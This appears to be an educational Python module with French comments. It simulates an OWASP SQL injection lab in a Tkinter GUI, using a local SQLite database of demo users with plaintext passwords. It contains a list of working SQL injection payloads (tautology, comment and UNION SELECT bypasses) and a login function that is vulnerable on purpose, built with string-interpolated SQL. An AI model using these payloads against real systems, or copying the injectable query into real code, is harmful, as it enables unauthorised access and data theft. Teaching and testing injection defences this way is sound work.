"""
modules/sql_injection.py

SCÉNARIO OWASP A03 – SQL INJECTION (Web Application Simulation)

Objectif pédagogique :
- Scanner SQL Injection basé sur une URL cible
- Injection via paramètres HTTP (GET)
- Simulation backend vulnérable
- Scan automatique multi-payloads

⚠️ Usage pédagogique uniquement
"""

import os
import sqlite3
import tkinter as tk
from tkinter import ttk, scrolledtext
from urllib.parse import urlparse

# =========================
# CONFIG
# =========================
DB_PATH = "data/webapp_demo.sqlite"

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR 1=1--",
    "admin' --",
    "' OR 'a'='a",
    "' UNION SELECT null, null, null--",
    "' UNION SELECT id, username, role FROM users--",
    "' OR (SELECT COUNT(*) FROM users)>0--"
]

# =========================
# BASE DE DONNÉES (DEMO)
# =========================
def init_demo_db():
    os.makedirs("data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("DROP TABLE IF EXISTS users")
    cur.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            role TEXT
        )
    """)

    users = [
        ("admin", "admin123", "admin"),
        ("alice", "alicepass", "user"),
        ("bob", "bobpass", "user")
    ]

    cur.executemany("INSERT INTO users VALUES (NULL, ?, ?, ?)", users)
    conn.commit()
    conn.close()

# =========================
# BACKEND WEB VULNÉRABLE
# =========================
def vulnerable_web_endpoint(path: str, params: dict):
    """
    Simule un endpoint web vulnérable (/login)
    """
    if path != "/login":
        return None, None, "404 Not Found (endpoint not simulated)"

    username = params.get("username", "")
    password = params.get("password", "")

    sql = (
        "SELECT id, username, role FROM users "
        f"WHERE username = '{username}' AND password = '{password}'"
    )

    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        conn.close()
        return sql, rows, None
    except Exception as e:
        return sql, None, str(e)

# =========================
# UI MODULE
# =========================
class SQLInjectionModule:
    """
    SQL Injection scanner basé sur URL
    """

    def __init__(self, parent):
        self.parent = parent
        init_demo_db()
        self.build_ui()

    def build_ui(self):
        frame = tk.Frame(self.parent, bg="#1e1e1e")
        frame.pack(fill="both", expand=True)

        tk.Label(
            frame,
            text="SQL Injection Scanner – OWASP A03 (Web Application)",
            bg="#1e1e1e",
            fg="white",
            font=("Arial", 14, "bold")
        ).pack(anchor="w", pady=5)

        tk.Label(
            frame,
            text=(
                "Scanner SQL Injection basé sur une URL cible.\n"
                "Le scanner teste automatiquement plusieurs payloads OWASP."
            ),
            bg="#1e1e1e",
            fg="white",
            justify="left"
        ).pack(anchor="w", pady=5)

        controls = tk.Frame(frame, bg="#1e1e1e")
        controls.pack(fill="x", pady=5)

        tk.Label(
            controls,
            text="Target URL:",
            bg="#1e1e1e",
            fg="white"
        ).pack(side="left", padx=5)

        self.url_entry = ttk.Entry(controls, width=40)
        self.url_entry.insert(0, "http://127.0.0.1/login")
        self.url_entry.pack(side="left", padx=5)

        ttk.Button(
            controls,
            text="Run SQL Injection Scan",
            command=self.run_scan
        ).pack(side="left", padx=5)

        self.output = scrolledtext.ScrolledText(
            frame,
            height=20,
            bg="#121212",
            fg="white"
        )
        self.output.pack(fill="both", expand=True, pady=5)

        self.log("[INFO] SQL Injection scanner ready.")
        self.log("[INFO] Demo database initialized.")

    def log(self, text):
        self.output.insert(tk.END, text + "\n")
        self.output.see(tk.END)

    def run_scan(self):
        self.log("\n[SCAN] Starting SQL Injection scan...\n")

        parsed = urlparse(self.url_entry.get())
        path = parsed.path if parsed.path else "/"

        for payload in SQLI_PAYLOADS:
            params = {
                "username": payload,
                "password": "test"
            }

            self.log(f"[TARGET] {parsed.geturl()}")
            self.log(f"[HTTP] GET {path}?username={payload}&password=test")

            sql, result, error = vulnerable_web_endpoint(path, params)

            if error:
                self.log(f"[ERROR] {error}")
            else:
                self.log(f"[SQL] {sql}")

                if result:
                    self.log("[RESULT] VULNERABLE ✔")
                    self.log("         → SQL Injection / Authentication bypass")
                else:
                    self.log("[RESULT] Not vulnerable")

            self.log("-" * 70)

        self.log("[SCAN] Finished.")
